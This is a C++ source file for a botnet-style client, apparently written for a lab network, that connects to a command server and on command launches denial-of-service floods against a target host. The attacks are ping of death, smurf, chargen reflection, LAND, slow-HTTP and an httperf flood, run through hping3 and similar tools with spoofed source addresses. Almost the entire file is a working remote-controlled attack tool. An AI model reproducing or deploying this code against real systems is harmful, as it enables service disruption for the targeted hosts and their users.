#include <arpa/inet.h>
#include <iostream>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/wait.h>

using namespace std;

int main()
{
	int sock = 0, valread, client_fd;
	struct sockaddr_in server_address;
	char *hello = "Hello from client";
	char buffer[1024] = { 0 };
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		cout << "\n Socket creation error \n";
		return -1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
	server_address.sin_port = htons(8080);

	start:
	while(connect(sock, (struct sockaddr *) &server_address, sizeof(server_address)) != 0) {
		sleep(5);
		goto start;
	}

	send(sock, hello, strlen(hello), 0);
	cout << "Hello message sent\n";
	
	pid_t pid;
	
	while(true)
	{
		bzero(&buffer, sizeof(buffer));
		int bytes = recv(sock, buffer, 1024, 0);
		
		if (bytes == 0) // server disconnected gracefully
		{
			close(sock);
			return 0;
		}
		
		if(strncmp("HALT", buffer, 4) == 0)
		{
			kill(-pid, SIGKILL);
			cout << "killed process group " << pid;
			continue;
		} 
		
		pid = fork();
		if (pid == 0) { // child procress
			setpgid(getpid(), getpid());
			if (strncmp("POD", buffer, 3) == 0) 
			{
				system("ping 10.0.2.15 -s 65000 -i 0.000000001");
			} else if (strncmp("SMURF", buffer, 5) == 0)
			{
				system("hping3 10.0.2.255 -a 10.0.2.15 --icmp -C 8 -D --flood");
			} else if (strncmp("CHARGEN", buffer, 7) == 0)
			{
				system("hping3 10.0.2.5 -a 10.0.2.15 -p 19 --udp -D --flood");
			} else if (strncmp("LAND", buffer, 4) == 0)
			{	system("for i in {1..100000}; do hping3 10.0.2.15 -a 10.0.2.15 -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;");
				
			} else if (strncmp("SLOWHTTP", buffer, 8) == 0)
			{
				system("slowhttptest -H -u http://10.0.2.15 -t GET -c 500 -r 30 -p 20 -l 3600");
			} else if (strncmp("FASTHTTP", buffer, 8) == 0)
			{
				system("httperf --server 10.0.2.15 --uri / --num-conns 100000 --rate 500");
			}
		} 
	}
	
        return 0;
}
